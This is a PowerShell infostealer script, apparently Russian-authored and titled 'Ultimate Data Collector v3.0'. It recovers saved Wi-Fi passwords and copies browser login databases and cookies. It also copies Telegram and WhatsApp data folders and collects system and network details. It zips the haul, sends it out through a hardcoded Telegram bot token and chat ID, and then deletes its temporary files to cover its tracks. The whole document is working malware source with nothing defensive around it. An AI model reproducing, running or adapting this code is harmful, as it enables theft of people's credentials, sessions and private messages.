<#
.SYNOPSIS
    Ultimate Data Collector v3.0
.DESCRIPTION
    Полностью автономный сбор всех данных с компьютера
#>

# Конфигурация Telegram
$BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null

function Send-ToTelegram {
    param([string]$Text)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ chat_id = $CHAT_ID; text = $Text }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15
    } catch { 
        Start-Sleep -Seconds 5
        try { Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15 } catch {}
    }
}

function Send-FileToTelegram {
    param([string]$FilePath)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    
    $body = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`";",
        "",
        $CHAT_ID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
        "Content-Type: application/octet-stream",
        "",
        $fileEnc,
        "--$boundary--"
    ) -join "`r`n"

    try {
        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    } catch { 
        Start-Sleep -Seconds 5
        try { Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body } catch {}
    }
}

# 1. УСИЛЕННЫЙ сбор WiFi паролей
function Get-WiFiPasswords {
    $outputFile = "$TEMP_DIR\wifi_passwords.txt"
    $result = @("=== WiFi Passwords (ALL METHODS) ===")
    
    # Метод 1: Через netsh (основной)
    try {
        $profiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object {
            $_.Split(":")[1].Trim()
        }
        
        foreach ($profile in $profiles) {
            try {
                $xmlFile = "$TEMP_DIR\$($profile.Replace(' ','_')).xml"
                netsh wlan export profile name=`"$profile`" key=clear folder="$TEMP_DIR" | Out-Null
                
                if (Test-Path $xmlFile) {
                    $password = (Select-String -Path $xmlFile -Pattern "keyMaterial").Line.Split(">")[1].Split("<")[0]
                    $result += "NETSH METHOD:"
                    $result += "SSID: $profile"
                    $result += "Password: $password"
                    $result += "----------------"
                }
            } catch { $result += "Error with $profile`: $_" }
        }
    } catch { $result += "Netsh method error: $_" }
    
    # Метод 2: Через ключи реестра (резервный)
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\"
        if (Test-Path $regPath) {
            $result += "`n=== REGISTRY METHOD ==="
            Get-ChildItem $regPath | ForEach-Object {
                $profile = Get-ItemProperty $_.PSPath
                $result += "SSID: $($profile.Description)"
                $result += "Profile GUID: $($profile.ProfileGuid)"
                $result += "----------------"
            }
        }
    } catch { $result += "Registry method error: $_" }
    
    $result -join "`n" | Out-File -FilePath $outputFile -Force
    return $outputFile
}

# 2. Продвинутый сбор данных браузеров
function Get-BrowserData {
    $outputFile = "$TEMP_DIR\browser_data.txt"
    $result = @("=== Browser Data (RAW COPY) ===")
    
    # Список всех возможных браузеров
    $browsers = @(
        @{ Name = "Chrome"; Paths = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\",
            "$env:APPDATA\Google\Chrome\User Data\Default\"
        )},
        @{ Name = "Edge"; Paths = @(
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\",
            "$env:APPDATA\Microsoft\Edge\User Data\Default\"
        )},
        @{ Name = "Opera"; Paths = @(
            "$env:APPDATA\Opera Software\Opera Stable\",
            "$env:LOCALAPPDATA\Opera Software\Opera Stable\"
        )},
        @{ Name = "Firefox"; Paths = @(
            "$env:APPDATA\Mozilla\Firefox\Profiles\",
            "$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\"
        )}
    )
    
    foreach ($browser in $browsers) {
        foreach ($path in $browser.Paths) {
            if (Test-Path $path) {
                try {
                    $browserDir = "$TEMP_DIR\$($browser.Name)_Data"
                    New-Item -Path $browserDir -ItemType Directory -Force | Out-Null
                    
                    # Копируем ВСЕ файлы браузера
                    $files = @(
                        "Login Data", "History", "Cookies", "Web Data", 
                        "Bookmarks", "Preferences", "Secure Preferences",
                        "Local State", "Last Session", "Last Tabs"
                    )
                    
                    foreach ($file in $files) {
                        $fullPath = Join-Path $path $file
                        if (Test-Path $fullPath) {
                            Copy-Item $fullPath $browserDir -Force -ErrorAction SilentlyContinue
                        }
                    }
                    
                    $result += "$($browser.Name): FULL DATA COPIED FROM $path"
                } catch { $result += "$($browser.Name) error: $_" }
            }
        }
    }
    
    $result -join "`n" | Out-File -FilePath $outputFile -Force
    return (Get-ChildItem $TEMP_DIR\*_Data).FullName
}

# 3. Сбор ВСЕХ данных мессенджеров
function Get-MessengerData {
    $result = @()
    
    # Telegram
    $telegramPaths = @(
        "$env:APPDATA\Telegram Desktop",
        "$env:LOCALAPPDATA\Telegram Desktop",
        "$env:USERPROFILE\Documents\Telegram Desktop"
    )
    
    foreach ($path in $telegramPaths) {
        if (Test-Path $path) {
            $dest = "$TEMP_DIR\Telegram_$([System.IO.Path]::GetFileName($path))"
            try {
                Copy-Item -Path $path -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
                $result += $dest
            } catch { Write-Output "Telegram copy error: $_" }
        }
    }
    
    # WhatsApp
    $whatsappPaths = @(
        "$env:LOCALAPPDATA\WhatsApp",
        "$env:APPDATA\WhatsApp"
    )
    
    foreach ($path in $whatsappPaths) {
        if (Test-Path $path) {
            $dest = "$TEMP_DIR\WhatsApp_$([System.IO.Path]::GetFileName($path))"
            try {
                Copy-Item -Path $path -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
                $result += $dest
            } catch { Write-Output "WhatsApp copy error: $_" }
        }
    }
    
    return $result
}

# 4. Дополнительные данные системы
function Get-SystemData {
    $outputFile = "$TEMP_DIR\system_info.txt"
    
    $result = @(
        "=== System Information ===",
        "Computer Name: $env:COMPUTERNAME",
        "Username: $env:USERNAME",
        "Domain: $env:USERDOMAIN",
        "OS Version: $([System.Environment]::OSVersion.VersionString)",
        "64-bit OS: $([System.Environment]::Is64BitOperatingSystem)",
        "PowerShell Version: $($PSVersionTable.PSVersion)",
        "Installed Programs:",
        (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
          Select-Object DisplayName, DisplayVersion, Publisher | Format-List | Out-String),
        "Network Info:",
        (ipconfig /all | Out-String),
        "ARP Table:",
        (arp -a | Out-String),
        "Active TCP Connections:",
        (netstat -ano | Out-String)
    )
    
    $result -join "`n" | Out-File -FilePath $outputFile -Force
    return $outputFile
}

# Основной сбор
try {
    # Отправляем стартовое уведомление
    Send-ToTelegram -Text "🚀 Начался сбор данных с $env:COMPUTERNAME ($env:USERNAME)..."
    
    # Собираем данные (параллельно)
    $jobs = @(
        Start-Job -ScriptBlock { Get-WiFiPasswords }
        Start-Job -ScriptBlock { Get-BrowserData }
        Start-Job -ScriptBlock { Get-MessengerData }
        Start-Job -ScriptBlock { Get-SystemData }
    )
    
    # Ждем завершения всех задач
    $results = $jobs | Wait-Job | Receive-Job
    
    # Архивируем ВСЕ данные
    $zipFile = "$env:TEMP\FULL_DATA_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    $allFiles = $results | Where-Object { $_ -ne $null }
    Compress-Archive -Path $allFiles -DestinationPath $zipFile -CompressionLevel Optimal -Force
    
    # Отправляем архив частями (если слишком большой)
    $maxSize = 45MB
    $fileInfo = Get-Item $zipFile
    
    if ($fileInfo.Length -gt $maxSize) {
        # Разбиваем архив на части
        $partSize = 40MB
        $partNum = 1
        $buffer = New-Object byte[] $partSize
        $stream = [System.IO.File]::OpenRead($zipFile)
        
        while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $partFile = "$zipFile.part$partNum"
            [System.IO.File]::WriteAllBytes($partFile, $buffer[0..($bytesRead-1)])
            
            Send-FileToTelegram -FilePath $partFile
            Remove-Item $partFile -Force
            $partNum++
        }
        $stream.Close()
    } else {
        Send-FileToTelegram -FilePath $zipFile
    }
    
    # Финальный отчет
    $report = @(
        "✅ Сбор данных завершен!",
        "📦 Итоговый архив: $(Split-Path $zipFile -Leaf)",
        "📝 Содержимое:",
        "🔑 WiFi пароли: $(if ($results[0]) {'✔'} else {'✖'})",
        "🌐 Данные браузеров: $(if ($results[1]) {'✔'} else {'✖'})",
        "📨 Данные мессенджеров: $(if ($results[2]) {'✔'} else {'✖'})",
        "💻 Системная информация: $(if ($results[3]) {'✔'} else {'✖'})",
        "🕒 Время завершения: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    ) -join "`n"
    
    Send-ToTelegram -Text $report
}
catch {
    Send-ToTelegram -Text "❌ КРИТИЧЕСКАЯ ОШИБКА: $_"
}
finally {
    # Очистка
    Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
    Get-Job | Remove-Job -Force
}
